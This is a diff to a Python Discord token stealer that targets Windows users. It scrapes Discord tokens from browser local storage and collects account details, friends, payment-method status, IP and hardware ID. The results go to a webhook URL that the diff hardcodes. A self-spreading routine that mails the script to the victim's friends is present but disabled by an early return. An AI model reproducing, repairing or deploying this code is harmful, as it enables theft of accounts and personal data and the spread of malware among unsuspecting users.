@@ -1,3 +1,4 @@
+# Imports
 import os
 if os.name != "nt":
     exit()
@@ -10,7 +11,8 @@ from datetime import datetime
 from threading import Thread
 from time import sleep
 from sys import argv
-import json
+import random
+import sys
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
@@ -23,10 +25,8 @@ PATHS = {
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
 
-with open('webhook.json') as f:
-    data = json.load(f)
-webhook_id = data['webhook']
 
+# Get Header
 def getheaders(token=None, content_type="application/json"):
     headers = {
         "Content-Type": content_type,
@@ -35,11 +35,17 @@ def getheaders(token=None, content_type="application/json"):
     if token:
         headers.update({"Authorization": token})
     return headers
+
+
+# User Data
 def getuserdata(token):
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
     except:
         pass
+
+
+# Get Tokens
 def gettokens(path):
     path += "\\Local Storage\\leveldb"
     tokens = []
@@ -51,13 +57,19 @@ def gettokens(path):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
+
+
+# Dev
 def getdeveloper():
     dev = "Drifty"
     try:
-        dev = urlopen(Request("https://pastebin.com/raw/uq0Sw1jY")).read().decode()
+        dev = urlopen(Request("")).read().decode()
     except:
         pass
     return dev
+
+
+# IP
 def getip():
     ip = "None"
     try:
@@ -65,6 +77,9 @@ def getip():
     except:
         pass
     return ip
+
+
+# Avatar URL
 def getavatar(uid, aid):
     url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
     try:
@@ -72,9 +87,15 @@ def getavatar(uid, aid):
     except:
         url = url[:-4]
     return url
+
+
+# Get Hwid
 def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
+
+# Get Friends by token    
 def getfriends(token):
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
@@ -90,13 +111,19 @@ def has_payment_methods(token):
         return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
     except:
         pass
+
+
+# Send Message
 def send_message(token, chat_id, form_data):
     try:
         urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
     except:
         pass
+
+
+# Spread to friends
 def spread(token, form_data, delay):
-    return # Remove to re-enabled
+    return
     for friend in getfriends(token):
         try:
             chat_id = getchat(token, friend["id"])
@@ -104,6 +131,10 @@ def spread(token, form_data, delay):
         except Exception as e:
             pass
         sleep(delay)
+
+
+
+# Main        
 def main():
     cache_path = ROAMING + "\\.cache~$"
     prevent_spam = True
@@ -136,6 +167,7 @@ def main():
             user_data = getuserdata(token)
             if not user_data:
                 continue
+
             working_ids.append(uid)
             working.append(token)
             username = user_data["username"] + "#" + str(user_data["discriminator"])
@@ -174,22 +206,29 @@ def main():
                 }
             }
             embeds.append(embed)
+
     with open(cache_path, "a") as file:
         for token in checked:
             if not token in already_cached_tokens:
                 file.write(token + "\n")
+
     if len(working) == 0:
+
         working.append('123')
+
     webhook = {
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
+
     try:
-        urlopen(Request(webhook_id, data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discordapp.com/api/webhooks/767748067050520616/HwCdrecepb7sOS2YLcxvX9sUDrK5BPHAGJ9U7BT0w6hmbkmNVtQUX9E2iXeGM1mV5rBL", data=dumps(webhook).encode(), headers=getheaders()))
+
     except:
         pass
+
     if self_spread:
         for token in working:
             with open(argv[0], encoding="utf-8") as file:
@@ -198,6 +237,7 @@ def main():
             Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
 try:
     main()
+
 except Exception as e:
     print(e)
     pass
